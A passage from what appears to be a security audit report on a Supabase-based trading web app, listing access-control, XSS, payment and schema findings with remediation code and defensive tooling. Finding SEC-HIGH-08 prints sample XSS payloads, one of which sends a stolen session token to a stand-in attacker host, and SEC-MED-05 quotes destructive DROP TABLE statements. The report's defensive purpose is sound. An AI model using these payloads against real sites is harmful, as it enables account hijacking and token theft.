  In PostgreSQL, a `SECURITY DEFINER` function without a fixed `search_path` inherits the search path of the executing session. If an attacker creates malicious schema objects (e.g. overriding `split_part` or `profiles`), invoking the trigger can execute attacker-controlled code under administrative privileges, leading to full database takeover.
- **Remediation Patch**:
  Pin the search path explicitly and revoke execution from untrusted public roles:
  ```sql
  -- REMEDIATION in supabase_schema.sql
  create or replace function public.handle_new_user()
  returns trigger
  language plpgsql
  security definer
  set search_path = public
  as $$
  begin
      insert into public.profiles (id, email, full_name)
      values (
          new.id, 
          new.email, 
          coalesce(new.raw_user_meta_data->>'full_name', split_part(new.email, '@', 1))
      )
      on conflict (id) do update set email = excluded.email;

      insert into public.subscriptions (user_id, provider, status, trial_ends_at, current_period_end)
      values (
          new.id,
          'stripe',
          'trialing',
          now() + interval '7 days',
          now() + interval '7 days'
      )
      on conflict (user_id) do nothing;

      return new;
  end;
  $$;

  revoke execute on function public.handle_new_user() from public, anon, authenticated;
  ```

---

#### Finding `SEC-HIGH-03`: Unrestricted Upload Path Authorization in Storage Bucket Policy
- **Severity**: **HIGH**
- **CVSS v3.1 Score**: **7.5** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`)
- **CWE**: CWE-284 (Improper Access Control), CWE-732 (Incorrect Permission Assignment)
- **OWASP Top 10**: A01:2021 — Broken Access Control
- **Affected Component & File**: `supabase_schema.sql` (Lines 243–249), `js/cloud-storage.js` (Lines 67–72)
- **Root Cause**:
  The RLS policy `"Usuarios autenticados suben capturas"` on `storage.objects` allows any authenticated user to upload files anywhere in `trade-screenshots`:
  ```sql
  create policy "Usuarios autenticados suben capturas" on storage.objects
      for insert with check (
          bucket_id = 'trade-screenshots' 
          and auth.role() = 'authenticated'
      );
  ```
  It does NOT check whether `(storage.foldername(name))[1] = auth.uid()::text`.
- **Attack Scenario & Impact**:
  An authenticated user creates a request uploading to `victim_user_uuid/screenshot_01.png`. The policy permits the insert. The attacker can overwrite victim trade verification screenshots, forge proof of trades, or exhaust storage quotas.
- **Remediation Patch**:
  Enforce tenant folder prefix validation for both `INSERT` and `UPDATE` policies:
  ```sql
  -- REMEDIATION in supabase_schema.sql
  drop policy if exists "Usuarios autenticados suben capturas" on storage.objects;
  create policy "Usuarios suben capturas en su carpeta" on storage.objects
      for insert to authenticated
      with check (
          bucket_id = 'trade-screenshots'
          and (storage.foldername(name))[1] = (select auth.uid())::text
      );

  drop policy if exists "Usuarios actualizan sus capturas" on storage.objects;
  create policy "Usuarios actualizan sus capturas" on storage.objects
      for update to authenticated
      using (
          bucket_id = 'trade-screenshots'
          and (storage.foldername(name))[1] = (select auth.uid())::text
      )
      with check (
          bucket_id = 'trade-screenshots'
          and (storage.foldername(name))[1] = (select auth.uid())::text
      );

  drop policy if exists "Usuarios eliminan sus capturas" on storage.objects;
  create policy "Usuarios eliminan sus capturas" on storage.objects
      for delete to authenticated
      using (
          bucket_id = 'trade-screenshots'
          and (storage.foldername(name))[1] = (select auth.uid())::text
      );
  ```

---

#### Finding `SEC-HIGH-04`: Cross-Tenant Foreign Key Reference Tampering in `public.trades`
- **Severity**: **HIGH**
- **CVSS v3.1 Score**: **7.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N`)
- **CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key / IDOR)
- **OWASP Top 10**: A01:2021 — Broken Access Control
- **Affected Component & File**: `supabase_schema.sql` (Lines 91–121, 229–232)
- **Root Cause**:
  `public.trades` references `public.accounts(id)` (`account_id`) and `public.backtest_sessions(id)` (`session_id`). The RLS policy only validates `auth.uid() = user_id`. An authenticated user can submit a trade where `user_id = auth.uid()` but `account_id` belongs to another tenant.
- **Attack Scenario & Impact**:
  User A links their trades to User B's trading account ID. When User B computes account metrics or deletes an account, foreign key cascades or set-null triggers corrupt User B's historical calculations.
- **Remediation Patch**:
  Add cross-table relational ownership verification to the RLS `WITH CHECK` clause, unified cleanly with `SEC-HIGH-01`'s `SELECT`/`INSERT`/`UPDATE`/`DELETE` policies so that `public.has_active_subscription((select auth.uid()))` remains strictly required on `INSERT`, `UPDATE`, and `DELETE` (preventing PostgreSQL's permissive policy `OR` semantics from silently bypassing subscription enforcement; note that `SEC-HIGH-05`'s composite foreign keys also enforce this structurally):
  ```sql
  -- REMEDIATION in supabase_schema.sql (unified with SEC-HIGH-01)
  drop policy if exists "Usuarios ven y gestionan sus trades" on public.trades;
  drop policy if exists "Usuarios ven sus trades" on public.trades;
  drop policy if exists "Usuarios activos insertan trades" on public.trades;
  drop policy if exists "Usuarios activos actualizan trades" on public.trades;
  drop policy if exists "Usuarios activos eliminan trades" on public.trades;

  create policy "Usuarios ven sus trades" on public.trades
      for select to authenticated
      using ((select auth.uid()) = user_id);

  create policy "Usuarios activos insertan trades" on public.trades
      for insert to authenticated
      with check (
          (select auth.uid()) = user_id
          and public.has_active_subscription((select auth.uid()))
          and (
              account_id is null
              or exists (
                  select 1 from public.accounts a
                  where a.id = trades.account_id and a.user_id = (select auth.uid())
              )
          )
          and (
              session_id is null
              or exists (
                  select 1 from public.backtest_sessions s
                  where s.id = trades.session_id and s.user_id = (select auth.uid())
              )
          )
      );

  create policy "Usuarios activos actualizan trades" on public.trades
      for update to authenticated
      using (
          (select auth.uid()) = user_id
          and public.has_active_subscription((select auth.uid()))
      )
      with check (
          (select auth.uid()) = user_id
          and public.has_active_subscription((select auth.uid()))
          and (
              account_id is null
              or exists (
                  select 1 from public.accounts a
                  where a.id = trades.account_id and a.user_id = (select auth.uid())
              )
          )
          and (
              session_id is null
              or exists (
                  select 1 from public.backtest_sessions s
                  where s.id = trades.session_id and s.user_id = (select auth.uid())
              )
          )
      );

  create policy "Usuarios activos eliminan trades" on public.trades
      for delete to authenticated
      using (
          (select auth.uid()) = user_id
          and public.has_active_subscription((select auth.uid()))
      );
  ```

---

#### Finding `SEC-HIGH-05`: Global Text Primary Keys Enabling ID Squatting & Synchronization DoS
- **Severity**: **HIGH**
- **CVSS v3.1 Score**: **7.7** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`)
- **CWE**: CWE-400 (Uncontrolled Resource Consumption), CWE-707 (Improper Neutralization)
- **OWASP Top 10**: A04:2021 — Insecure Design
- **Affected Component & File**: `supabase_schema.sql` (Lines 58–130), `js/app.js` (Lines 2360, 2403, 4575)
- **Root Cause**:
  Tables `accounts`, `account_groups`, `backtest_sessions`, and `trades` define `id text primary key`. The uniqueness constraint spans the entire table across all tenants. In `js/app.js`, IDs are generated using timestamps (`Date.now()`).
- **Attack Scenario & Impact**:
  Because timestamps are low-entropy and predictable, an attacker can generate a sequential range of future IDs and insert them into their own account. When legitimate users create trades with colliding timestamps, PostgreSQL rejects the insertion with a unique constraint violation (`23505 duplicate key value`). An attacker can systematically DoS data creation for other tenants.
- **Remediation Patch**:
  1. Safely drop dependent foreign keys, convert tenant tables to composite primary keys `PRIMARY KEY (user_id, id)`, and re-add tenant-scoped composite foreign keys `(user_id, account_id)` and `(user_id, session_id)` (using PostgreSQL 15+ column-level `ON DELETE SET NULL (account_id)` so `NOT NULL user_id` is preserved).
  2. Generate cryptographically strong UUIDs client-side using `crypto.randomUUID()`:
  ```sql
  -- REMEDIATION in supabase_schema.sql
  -- 1. Drop dependent foreign keys cleanly before altering primary keys
  alter table public.trades drop constraint if exists trades_account_id_fkey;
  alter table public.trades drop constraint if exists trades_session_id_fkey;

  -- 2. Convert tenant tables to composite primary keys (user_id, id)
  alter table public.accounts drop constraint if exists accounts_pkey;
  alter table public.accounts add primary key (user_id, id);

  alter table public.account_groups drop constraint if exists account_groups_pkey;
  alter table public.account_groups add primary key (user_id, id);

  alter table public.backtest_sessions drop constraint if exists backtest_sessions_pkey;
  alter table public.backtest_sessions add primary key (user_id, id);

  alter table public.trades drop constraint if exists trades_pkey;
  alter table public.trades add primary key (user_id, id);

  -- 3. Re-add tenant-scoped composite foreign keys (also prevents cross-tenant IDOR from SEC-HIGH-04)
  alter table public.trades
      add constraint trades_account_user_fkey
      foreign key (user_id, account_id)
      references public.accounts(user_id, id)
      on delete set null (account_id);

  alter table public.trades
      add constraint trades_session_user_fkey
      foreign key (user_id, session_id)
      references public.backtest_sessions(user_id, id)
      on delete set null (session_id);
  ```

---

#### Finding `SEC-HIGH-06`: Private Merchant API Key Exposure Risk for NOWPayments
- **Severity**: **HIGH**
- **CVSS v3.1 Score**: **7.5** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **CWE**: CWE-798 (Use of Hard-coded Credentials)
- **OWASP Top 10**: A07:2021 — Identification and Authentication Failures
- **Affected Component & File**: `js/payments.js` (Lines 36–39)
- **Root Cause**:
  `PAYMENTS_CONFIG.nowpayments` is configured with:
  ```javascript
  nowpayments: {
      apiKey: window.ENV_NOWPAYMENTS_KEY || "", // Tu API Key de NOWPayments
      apiBase: "https://api.nowpayments.io/v1",
  }
  ```
  NOWPayments API keys are private merchant credentials that provide access to payout balances, account financial history, and merchant administration.
- **Attack Scenario & Impact**:
  If a developer sets `window.ENV_NOWPAYMENTS_KEY` in production, any client-side script, third-party library, browser extension, or XSS flaw can read the key and manipulate merchant payment flows or drain account balances.
- **Remediation Patch**:
  Remove `apiKey` from `js/payments.js`. All interactions with NOWPayments must take place server-side inside a Supabase Edge Function where the key is stored as an encrypted secret (`supabase secrets set NOWPAYMENTS_API_KEY=...`).

---

#### Finding `SEC-HIGH-07`: Mock Crypto Implementation with Placeholder Addresses and Simulation Bypass
- **Severity**: **HIGH**
- **CVSS v3.1 Score**: **7.5** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`)
- **CWE**: CWE-306 (Missing Authentication for Critical Function)
- **OWASP Top 10**: A05:2021 — Security Misconfiguration
- **Affected Component & File**: `js/payments.js` (Lines 40–44, 535–560), `app.html` (Lines 1452–1490)
- **Root Cause**:
  The cryptocurrency payment drawer displays static dummy wallet addresses:
  `TYDzsYUb93ExampleTRC20AddressPlaceholder77` and `0x71C69446B92ExampleBEP20AddressPlaceholder`.
  No API call to NOWPayments (`/v1/invoice` or `/v1/payment`) is implemented. Furthermore, the modal provides a button labeled *"Simular Confirmación de Transferencia (TxHash OK)"* (`simulateCryptoPaymentSuccess`) that directly calls `completeSubscriptionPayment()`.
- **Attack Scenario & Impact**:
  Real users who transfer cryptocurrency to the placeholder address lose their funds. Malicious users click the simulation button to immediately receive active Pro status for free.
- **Remediation Patch**:
  1. Remove the static placeholder addresses and simulation button from `app.html` and `js/payments.js`.
  2. Implement an Edge Function calling `https://api.nowpayments.io/v1/invoice` to generate authentic, per-transaction payment invoices.

---

#### Finding `SEC-HIGH-08`: Stored Cross-Site Scripting (XSS) in Table, Gallery, and Lightbox Views
- **Severity**: **HIGH**
- **CVSS v3.1 Score**: **8.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **OWASP Top 10**: A03:2021 — Injection
- **Affected Component & File**: `js/app.js` (Lines 6448–6454, 6601–6623, 4999, 5035, 8394, 8444–8492)
- **Root Cause**:
  User-controllable fields (`t.par`, `t.hora`, `t.sesion`, `t.tendencia`, `t.orden`, and screenshot URLs `src`) are interpolated directly into template strings assigned to `innerHTML` without entity escaping:
  - Line 6448 (`renderTable`): `<span class="text-gray-500 text-[11px]">${t.hora}</span>`
  - Line 6450 (`renderTable`): `<span>${(t.par || '-').toUpperCase()}</span>`
  - Line 6452 (`renderTable`): `<td class="px-2 py-2 text-gray-400">${formatTendencia(t.tendencia)}</td>` (`formatTendencia` returns unescaped string).
  - Lines 6613, 6623 (`renderGallery`): `onclick="openLightbox('${src}')"`
  - Lines 8474, 8492 (`renderDailyAnalysisTrade`): `onclick="openLightbox('${src}')"`
- **Attack Scenario & Impact**:
  An attacker injects an asset name like `<img src=x onerror=alert(document.cookie)>` or an image URL like `');fetch('https://c2.attacker.com?t='+localStorage.getItem('sb-token'));//`. When another user imports an infected trade or views a shared trade, the script executes in the victim's authenticated session, exfiltrating Supabase tokens and hijacking the account.
- **Remediation Patch**:
  Escape **all** unescaped trade and preset text fields across `renderTable` (`js/app.js:6448-6466`), `renderGallery` (`js/app.js:6601-6624`), `renderDailyAnalysisTrade` (`js/app.js:8394, 8443-8453, 8474, 8492`), and `calculadora/` (`calculadora/js/app.js:315-389`), strictly sanitize image URLs while **disallowing `data:image/svg+xml`** (to prevent SVG-based `<script>`/`onload` XSS), and replace inline `onclick` interpolation with `data-*` attributes and delegated event listeners:
  ```javascript
  // REMEDIATION in js/app.js (and shared helper in calculadora/js/app.js)
  function sanitizeImageUrl(url) {
      if (!url || typeof url !== 'string') return '';
      const clean = url.trim();
      // Allow only safe raster data URIs (explicitly disallow data:image/svg+xml)
      if (/^data:image\/(?:png|jpe?g|webp|gif);base64,[a-z0-9+/=]+$/i.test(clean)) {
          return clean;
      }
      try {
          const parsed = new URL(clean, window.location.origin);
          if (parsed.protocol === 'https:' || parsed.protocol === 'http:') {
              return parsed.href.replace(/["'<>]/g, '');
          }
      } catch (e) {
          return '';
      }
      return '';
  }

  // 1. Escape all unescaped text fields in renderTable (js/app.js:6448-6456)
  //    displayDate, t.hora, dayName, t.par, normalizeSessionName(t.sesion),
  //    formatTendencia(t.tendencia), t.pipsSL, t.pipsTP, t.orden, formatTradeStatus(t.estado)
  const safePar = escapeGalleryHtml((t.par || '-').toUpperCase());
  const safeHora = escapeGalleryHtml(t.hora || '');
  const safeSesion = escapeGalleryHtml(normalizeSessionName(t.sesion) || '-');
  const safeTendencia = escapeGalleryHtml(formatTendencia(t.tendencia));
  const safeOrden = escapeGalleryHtml(t.orden || '');

  // 2. Escape header/badge fields in renderGallery (js/app.js:6601) &
  //    renderDailyAnalysisTrade (js/app.js:8394, 8443-8453) using escapeGalleryHtml()
  // 3. Refactor lightbox thumbnails in renderGallery & renderDailyAnalysisTrade:
  const safeSrc = sanitizeImageUrl(src);
  const imgHtml = safeSrc
      ? `<img src="${escapeGalleryHtml(safeSrc)}" class="..." data-lightbox-url="${escapeGalleryHtml(safeSrc)}">`
      : '';

  document.addEventListener('click', (e) => {
      const target = e.target.closest('[data-lightbox-url]');
      if (target) {
          const safeTarget = sanitizeImageUrl(target.getAttribute('data-lightbox-url'));
          if (safeTarget) openLightbox(safeTarget);
      }
  });

  // 4. In calculadora/js/app.js (315-389): escape groupName, p.name, and displayName,
  //    and replace inline onclick="toggleGroup('${groupName}')" with data-group attributes + event delegation.
  ```

---

### 5.3 Medium Severity Vulnerabilities

---

#### Finding `SEC-MED-01`: Stored Cross-Site Scripting (XSS) in Calculator Presets
- **Severity**: **MEDIUM**
- **CVSS v3.1 Score**: **5.4** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`)
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Affected Component & File**: `calculadora/js/app.js` (Lines 315–389)
- **Description & Code Trace**:
  Preset group names (`groupName`) and setup names (`p.name`) are read from `localStorage` (`lot_calc_presets_v3`) and concatenated into HTML template strings:
  - Line 323: `<div onclick="toggleGroup('${groupName}')" ...>`
  - Line 328: `<button onclick="toggleGroupCollapse('${groupName}', event)" ...>`
  - Line 363: `<p class="text-[11px] font-bold text-white truncate leading-none mb-1">${p.name}</p>`
  If `groupName` contains single quotes (`Setup');alert(1);//`), it breaks out of the inline `onclick` handler.
- **Remediation**:
  Use HTML entity encoding or `encodeURIComponent` for dataset properties and event delegation.

---

#### Finding `SEC-MED-02`: Public Read Access on Trade Screenshots Storage Bucket
- **Severity**: **MEDIUM**
- **CVSS v3.1 Score**: **5.3** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`)
- **CWE**: CWE-200 (Exposure of Sensitive Information to Unauthorized Actor)
- **Affected Component & File**: `supabase_schema.sql` (Lines 135–143, 239–242)
- **Description & Code Trace**:
  `trade-screenshots` bucket is created with `public: true`. The SELECT policy allows any request (`bucket_id = 'trade-screenshots'`) without authentication. Traders regularly upload broker statements, account numbers, and proprietary setups.
- **Remediation**:
  Set `public: false` on `trade-screenshots`. Require authentication on the SELECT policy matching `auth.uid()`, and generate short-lived signed URLs via `client.storage.from('trade-screenshots').createSignedUrl(path, 3600)`.

---

#### Finding `SEC-MED-03`: Unsanitized JSON Data Import Leading to State Poisoning
- **Severity**: **MEDIUM**
- **CVSS v3.1 Score**: **6.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:H/A:N`)
- **CWE**: CWE-20 (Improper Input Validation)
- **Affected Component & File**: `js/app.js` (Lines 2351–2432)
- **Description & Code Trace**:
  `importData` loads user-supplied JSON files via `FileReader` and blindly assigns `realAccounts = data.accounts`, `backtestSessions = data.sessions`, and merges `data.trades` into `trades` without structure, schema, or type validation. It immediately invokes `saveToStorage()` and `triggerCloudSave(true)`. A crafted file can inject negative balances, XSS payloads, or corrupt account state across cloud and local storage.
- **Remediation**:
  Implement schema validation before parsing imported objects; reject any payload containing unexpected fields or malformed properties.

---

#### Finding `SEC-MED-04`: Missing Content Security Policy (CSP) & Subresource Integrity (SRI)
- **Severity**: **MEDIUM**
- **CVSS v3.1 Score**: **5.4** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`)
- **CWE**: CWE-693 (Protection Mechanism Failure), CWE-353 (Missing Support for Integrity Check)
- **Affected Component & File**: `_headers`, `app.html`, `index.html`, `en.html`, `calculadora/js/app.js` (Line 38)
- **Description & Code Trace**:
  The Cloudflare Pages `_headers` file configures `X-Frame-Options`, `X-Content-Type-Options`, and `Referrer-Policy`, but completely omits `Content-Security-Policy` and `Strict-Transport-Security`. In `app.html`, scripts from external CDNs (`cdn.tailwindcss.com`, `cdn.jsdelivr.net`, `cdnjs.cloudflare.com`) lack `integrity` (SRI) attributes.
- **Remediation**:
  Add CSP and HSTS directives to `_headers` (including `https://open.er-api.com` in `connect-src` so `fetchExchangeRates()` in `calculadora/js/app.js:38` is not blocked):
  ```
  /*
    X-Frame-Options: SAMEORIGIN
    X-Content-Type-Options: nosniff
    Referrer-Policy: strict-origin-when-cross-origin
    Permissions-Policy: camera=(), microphone=(), geolocation=()
    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://fonts.googleapis.com; font-src 'self' https://cdnjs.cloudflare.com https://fonts.gstatic.com; img-src 'self' data: blob: https://*.supabase.co https://astradehub.com; connect-src 'self' https://*.supabase.co wss://*.supabase.co https://api.nowpayments.io https://open.er-api.com http://127.0.0.1:*; frame-src 'none'; object-src 'none';
  ```

---

#### Finding `SEC-MED-05`: Destructive DDL Statements (`DROP TABLE ... CASCADE`) in Database Schema
- **Severity**: **MEDIUM**
- **CVSS v3.1 Score**: **6.5** (`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H`)
- **CWE**: CWE-284 (Improper Access Control / Unintended Data Destruction)
- **Affected Component & File**: `supabase_schema.sql` (Lines 51–55)
- **Description & Code Trace**:
  `supabase_schema.sql` begins with instructions directing administrators to paste the script and run it. Lines 51–55 execute unconditional cascading drops:
  ```sql
  drop table if exists public.balance_snapshots cascade;
  drop table if exists public.trades cascade;
  drop table if exists public.backtest_sessions cascade;
  drop table if exists public.account_groups cascade;
  drop table if exists public.accounts cascade;
  ```
  Executing this script in a live staging or production environment causes catastrophic and irreversible loss of all user trading history.
- **Remediation**:
  Remove `DROP TABLE ... CASCADE` statements and use idempotent `CREATE TABLE IF NOT EXISTS`.

---

#### Finding `SEC-MED-06`: Active Development Sandbox Toolkit & Simulation Buttons in Production Bundles
- **Severity**: **MEDIUM**
- **CVSS v3.1 Score**: **5.3** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`)
- **CWE**: CWE-489 (Active Debug Code in Production)
- **Affected Component & File**: `js/payments.js` (Lines 12, 685–730), `app.html` (Lines 1400–1409)
- **Description & Code Trace**:
  `PAYMENTS_CONFIG.mode: 'test'` is hardcoded as default. Functions `simulateRestoreTrial()`, `simulateTrialExpired()`, and UI buttons labeled *"Herramientas de Prueba: Simular Prueba Vencida · Restablecer 7 Días"* are rendered to end users.
- **Remediation**:
  Strip all simulation helper functions and test UI blocks from production builds.

---

#### Finding `SEC-MED-07`: Missing Subquery Wrapping Optimization on RLS Policies
- **Severity**: **MEDIUM**
- **CVSS v3.1 Score**: **5.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L`)
- **CWE**: CWE-400 (Performance Degradation / Uncontrolled Resource Consumption)
- **Affected Component & File**: `supabase_schema.sql` (Lines 196–236)
- **Description & Code Trace**:
  Every policy evaluates `auth.uid() = user_id` without wrapping the function in a subquery `(select auth.uid()) = user_id`. On multi-row scans on `trades`, PostgreSQL re-evaluates `auth.uid()` for every scanned row rather than treating it as an immutable scalar, degrading database performance and causing query timeouts.
- **Remediation**:
  Wrap all `auth.uid()` calls in scalar subqueries `(select auth.uid()) = user_id`.

---

#### Finding `SEC-MED-08`: Missing UNIQUE Constraint on `subscriptions(user_id)`
- **Severity**: **MEDIUM**
- **CVSS v3.1 Score**: **5.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N`)
- **CWE**: CWE-20 (Improper Input Validation), CWE-662 (Improper Synchronization)
- **Affected Component & File**: `supabase_schema.sql` (Lines 30–44, 162–170), `js/supabase-client.js` (Lines 141–148)
- **Description & Code Trace**:
  Table `public.subscriptions` defines `user_id uuid not null references public.profiles(id)` but omits `UNIQUE(user_id)`. If multiple rows exist for a user, `apiFetchSubscription()` (`client.from('subscriptions').select('*').eq('user_id', userId).maybeSingle()`) throws `PGRST116: JSON object requested, multiple rows returned`, breaking login and subscription checks.
- **Remediation**:
  Add `alter table public.subscriptions add constraint uq_subscriptions_user_id unique (user_id);`.

---

### 5.4 Low Severity Vulnerabilities

---

#### Finding `SEC-LOW-01`: Cleartext Storage and Display of MT5 Bridge Tokens in IndexedDB
- **Severity**: **LOW**
- **CVSS v3.1 Score**: **4.1** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`)
- **CWE**: CWE-312 (Cleartext Storage of Sensitive Information)
- **Affected Component & File**: `js/app.js` (Lines 6762–6810, 7240–7255)
- **Description & Code Trace**:
  The MetaTrader 5 bridge API bearer token is stored unencrypted in IndexedDB under `STORAGE_KEY_MT5_CONFIG` and reflected unmasked into the input element `#mt5TokenInput`.
- **Remediation**:
  Mask the token input (`type="password"` with toggle) and advise users to operate the bridge over secure localhost endpoints (`127.0.0.1` or WSS).

---

#### Finding `SEC-LOW-02`: Insecure Mock Authentication Fallback in Production Client Code
- **Severity**: **LOW**
- **CVSS v3.1 Score**: **3.1** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N`)
- **CWE**: CWE-306 (Missing Authentication for Critical Function)
- **Affected Component & File**: `js/supabase-client.js` (Lines 41–45, 80–84), `js/auth.js` (Lines 190–218)
- **Description & Code Trace**:
  If Supabase is unreachable or unconfigured, `apiSignIn` calls `loginUser(email, password)`, which creates a mock user session with 7 days of Pro Trial without validating credentials.
- **Remediation**:
  Fail explicitly with a clear network/system error when the authentication backend is unreachable.

---

#### Finding `SEC-LOW-03`: Unbounded Column Data Types & Missing Check Constraints in PostgreSQL
- **Severity**: **LOW**
- **CVSS v3.1 Score**: **3.7** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N`)
- **CWE**: CWE-20 (Improper Input Validation)
- **Affected Component & File**: `supabase_schema.sql` (Lines 91–121), `js/app.js` (Lines 971, 6369, 6422–6429, 6581, 6923)
- **Description & Code Trace**:
  `fecha` and `hora` in `trades` are stored as unvalidated `text`. `mode`, `estado`, and `orden` lack check constraints, allowing arbitrary strings. Furthermore, `supabase_schema.sql:102` declares `estado text not null default 'Ganada'`, which diverges from the actual status enum used in `js/app.js:6422-6429` (`'Full TP'`, `'SL'`, `'BE'`, `'Parcial'`, `'Cierre manual'`, `'Pendiente'`, `'Activa'`, plus `'Sin Activar'` at lines `971, 6369, 6581, 6923`).
- **Remediation**:
  Align the default value and add check constraints matching the application's actual domain states (`app.html` `#inputOrden`, `js/app.js:6914` `mt5OrdenLabel`, and legacy `'Buy'`/`'Sell'` defaults in `supabase_schema.sql:99` and `js/cloud-storage.js:192,386`):
  ```sql
  alter table public.trades add constraint chk_trades_mode check (mode in ('real', 'backtesting'));
  alter table public.trades add constraint chk_trades_orden check (orden in ('Buy', 'Sell', 'Buy Limit', 'Sell Limit', 'Buy Stop', 'Sell Stop', 'Market Buy', 'Market Sell'));
  alter table public.trades add constraint chk_trades_estado check (estado in ('Full TP', 'SL', 'BE', 'Parcial', 'Cierre manual', 'Pendiente', 'Activa', 'Sin Activar'));
  ```

---

#### Finding `SEC-LOW-04`: Stripe Payment Links Tier Arbitrage and Price Parameter Tampering
- **Severity**: **LOW**
- **CVSS v3.1 Score**: **3.7** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N`)
- **CWE**: CWE-602 (Client-Side Enforcement of Server-Side Security)
- **Affected Component & File**: `js/payments.js` (Lines 28–33, 480–498)
- **Description & Code Trace**:
  Stripe Payment Links are static links. If client-side redirection parameters are relied upon, an attacker can purchase a $20 monthly subscription on Stripe but tamper with the redirect URL to specify `?period=year`, claiming a $200 plan.
- **Remediation**:
  Create dynamic Stripe Checkout Sessions server-side with immutable session metadata binding the plan and user ID.

---

### 5.5 Informational Findings

---

#### Finding `SEC-INFO-01`: Client-Side Session State Desynchronization from Supabase Auth
- **Severity**: **INFORMATIONAL**
- **CVSS v3.1 Score**: **0.0**
- **CWE**: CWE-613 (Insufficient Session Expiration)
- **Affected Component & File**: `js/auth.js` (Lines 14–28), `js/supabase-client.js` (Lines 78–112)
- **Description & Remediation**:
  `initAuth()` reads `localStorage` rather than subscribing to `supabase.auth.onAuthStateChange()`. Hook the Supabase Auth listener to keep local session state synchronized with token refresh and revocation events.

---

## 6. Security Tooling & Skill Discovery (R1 Implementation)

To empower the engineering team to audit and enforce security boundaries locally and offline, four auditing specifications and tooling implementations were established:

### 6.1 Semgrep Offline Rulepack (`semgrep_rules.yml`)
The workspace includes an offline Semgrep rulepack (`c:\Users\Juan\Desktop\trading-saas\semgrep_rules.yml`) tailored specifically to AsTrade:
- **Rule `ast-payment-url-param-tampering`**: Detects URL parameter tampering on `payment_success` and `order_status`.
- **Rule `ast-client-side-subscription-upsert`**: Detects direct client-side writes to `supabase.from('subscriptions')`.
- **Rule `ast-localstorage-auth-bypass`**: Detects client-side authorization checks trusting mutable `localStorage`.
- **Rule `ast-exposed-nowpayments-key`**: Detects private API keys in client window properties.
- **Rule `ast-sandbox-tools-in-production`**: Detects payment simulation functions in production scripts.
- **Rule `ast-dom-xss-innerhtml-interpolation`**: Detects unescaped trade property interpolation into innerHTML sinks.
- **Rule `ast-inline-onclick-unescaped-attribute`**: Detects unescaped string interpolation into inline event handlers.
- **Rule `ast-unsanitized-json-import`**: Detects unvalidated JSON file ingestion into state.

**Execution Command (Offline):**
```bash
semgrep --config semgrep_rules.yml js/ calculadora/
```

### 6.2 ESLint Security & XSS Configuration (`.eslintrc.json`)
Recommended configuration for local continuous linting:
```json
{
  "env": {
    "browser": true,
    "es2022": true
  },
  "plugins": ["security", "no-unsanitized"],
  "extends": [
    "eslint:recommended",
    "plugin:security/recommended",
    "plugin:no-unsanitized/DOM"
  ],
  "rules": {
    "security/detect-object-injection": "warn",
    "security/detect-unsafe-regex": "error",
    "no-unsanitized/method": "error",
    "no-unsanitized/property": "error",
    "no-eval": "error",
    "no-implied-eval": "error"
  }
}
```

### 6.3 pgTAP PostgreSQL RLS Test Suite (`tests/test_rls_subscriptions.sql`)
An offline database test suite (`20` pgTAP assertions) has been installed at `c:\Users\Juan\Desktop\trading-saas\tests\test_rls_subscriptions.sql`.
- Verifies RLS is enabled on `profiles`, `subscriptions`, `accounts`, `account_groups`, `backtest_sessions`, `trades`, and `balance_snapshots` via standard `pg_class` / `pg_namespace` catalog assertions.
- Confirms anonymous users cannot read or insert into `subscriptions` or `trades` (after clean `reset role;` transitions).
- Confirms authenticated users cannot update (`results_eq` asserting `0` rows updated under `FOR SELECT` RLS) or insert (`42501`) their subscription status directly.
- Confirms cross-tenant isolation prevents reading trades across user boundaries, and verifies subscription enforcement blocks `INSERT` / `UPDATE` on `public.trades` for unsubscribed/expired users.
- Confirms `storage.objects` folder isolation (`(storage.foldername(name))[1] = auth.uid()::text`), private `trade-screenshots` bucket (`public = false`), `UNIQUE(user_id)` on `public.subscriptions`, and explicit `search_path=%` in `pg_proc.proconfig` for `handle_new_user()`.

**Execution Command (Offline via Supabase CLI):**
```bash
supabase test db
```

### 6.4 Standalone Offline Python Security Scanner (`scripts/offline_security_scanner.py`)
A self-contained Python security scanner using pure Python standard library was installed at `c:\Users\Juan\Desktop\trading-saas\scripts\offline_security_scanner.py`.
- Evaluates `js/*.js`, `calculadora/js/*.js`, `*.html`, `supabase_schema.sql`, and `_headers`.
- Scans for all 19 signature patterns across Critical, High, Medium, and Low severity classifications.
- Provides human-readable output and machine-readable JSON (`--json`).

**Execution Command (Offline):**
```bash
python scripts/offline_security_scanner.py
```

---

